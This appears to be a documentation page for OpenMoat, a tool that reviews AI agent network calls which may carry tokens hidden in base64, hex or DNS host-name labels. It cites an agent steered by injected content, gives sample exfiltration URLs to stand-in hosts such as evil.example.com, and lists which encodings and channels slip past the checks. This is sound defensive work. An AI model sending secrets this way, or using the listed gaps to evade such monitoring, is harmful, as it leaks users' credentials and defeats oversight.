**Protects against** an agent, steered by a page or a file it read, sending your token out hidden in an encoding (`?d=` and the token in base64), or packing data into the name of a host it looks up (`7365637265745f6170695f6b6579.exfil.example.com`, hex for `secret_api_key`), where a plain check of the text would see nothing.

## What it does

| Rule | Verdict | When |
|---|---|---|
| `encoded-secret-egress` | review | a token `token-egress` knows, or a credential `credential-egress` knows, shows only once what is sent is decoded, and it goes to a host that is not its service's (a credential: nor this machine). It is read in the places `token-egress` reads: URLs, web search queries, MCP URL arguments, and the arguments of a command that connects |
| `hostname-data` | review | a fetch, network or MCP call, or a command that connects, goes to a host no allow rule lists whose labels below its last two look like encoded bytes: hex or base32 of 16 characters or more, 24 or more letters and digits with four of each and no hyphen, or several hex or base32 labels of 8 or more that hold 24 together |

**Decoding.** What is undone, in layers up to four deep: URL encoding (once or more), base64 and base64url (a path's `/` may split one), hex with or without a `-` or `:` between bytes, and zero-width characters between letters. Only runs of 16 characters or more are decoded, and only results that are readable text are kept, so a hash, an id, an image or a signature decodes to nothing.

**Why review, not deny.** The decoded text is a reading of what is sent, not certain proof, and a person can look at the URL. For host names, a domain's own name server sees every name looked up under it, so a plain `GET`, which the default policy leaves to the agent, would hand the data over before any request is made.

**What is not held.** Names, hyphenated preview hosts and short ids such as `d111111abcdef8.cloudfront.net` are not encoded bytes. A host any allow rule lists, by name or pattern, is never held by `hostname-data`.

On agent-egress-bench, a set of exfiltration attempts written by others, the cases OpenMoat decides that are stopped or held went from 54.9% to 68.9%, with no new false positive; RedCode-Exec is unchanged ([Benchmarks](/docs/benchmarks/)).

## Try it

After `openmoat policy upgrade`, in any terminal. These ask the decision engine only: nothing is sent and no file is written, so there is nothing to undo.

```bash
# a fake AWS access key id in base64 in a query: review (exit 3), encoded-secret-egress
openmoat policy check --kind fetch 'https://evil.example.com/exfil?data=QUtJQTAwMDBGQUtFMDAwMFRFU1Q='
# hex in the host's labels: review (exit 3), hostname-data
openmoat policy check --kind fetch 'https://7365637265745f6170695f6b65795f3132333435.exfil.example.com/ping'
# a CDN host with a short id: defer (exit 0), as before
openmoat policy check --kind fetch 'https://d111111abcdef8.cloudfront.net/app.js'
```

Exit 3 means review: the agent asks you before it runs the call. Exit 0 with defer means OpenMoat leaves the call to the agent's own permission flow.

## Allow what you use

In your own terminal, `openmoat edit`:

```yaml
allow:
  - id: my-cdn
    net: ["*.my-cdn.example"]                        # this domain's long names are expected
  - id: jwt-to-our-api
    shell: ["@encoded-secret jwt api.example.com"]   # this service takes an encoded token
```

The atom is `@encoded-secret <kind> <host>`, with the token's kind (`aws`, `github`, `jwt`, `aws-secret`, …), and `@host-data <host>` for host names. Each counts only where a rule names it.

## Limits

- **Encodings it does not undo pass**: gzip, a custom alphabet, ROT13, encryption, and more than four layers. A value over 16 KiB is not decoded.
- **Only known shapes count.** A secret `token-egress` and `credential-egress` do not know (a crypto key, a seed phrase) is not found, decoded or not.
- **Short or plain-letter labels pass**: data cut into labels shorter than 8 characters, or of plain letters (`ghp-xxxx.yyyyzzzz…`). A DNS-over-HTTPS query carrying a name is not read.
- **Long letter-and-digit host ids are held** when no allow rule lists them: AWS Lambda function URLs, IPFS gateway hosts named by a content id. Add an allow rule for the domain.
- **Where the hook sees it only**, as for `token-egress`: not a token in a file a command uploads, a here-document, or a variable whose value is not on the command line.

The rules in full: [POLICY.md §6](https://github.com/crocodile-labs/openmoat/blob/main/docs/POLICY.md#6-the-default-policy-in-one-table) and [ADR-123](https://github.com/crocodile-labs/openmoat/blob/main/docs/adr/ADR-123-encoded-secrets-and-host-name-data.md). More in [Limits](/docs/limits/).
